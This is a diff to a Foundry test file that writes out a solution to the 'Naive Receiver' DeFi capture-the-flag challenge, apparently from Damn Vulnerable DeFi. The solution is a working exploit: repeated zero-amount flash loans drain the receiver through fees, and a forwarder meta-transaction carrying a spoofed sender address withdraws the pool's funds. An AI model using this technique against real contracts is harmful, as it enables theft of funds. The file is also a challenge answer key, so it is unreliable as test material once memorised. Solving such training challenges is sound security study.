@@ -6,7 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
-
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -76,7 +76,30 @@ contract NaiveReceiverChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_naiveReceiver() public checkSolvedByPlayer {}
+    function test_naiveReceiver() public checkSolvedByPlayer {
+        bytes[] memory calldatas = new bytes[](11);
+        for(uint256 i = 0 ; i < 10 ; i++){
+            calldatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan,(receiver, address(weth), 0,""));
+        }
+        calldatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), deployer);
+        bytes memory data = abi.encodeCall(Multicall.multicall,(calldatas));
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: forwarder.nonces(player),
+            data: data,
+            deadline: 1
+        });
+        bytes32 digest =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        bool success = forwarder.execute(request, signature);  
+        console.log("Success: ", success);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
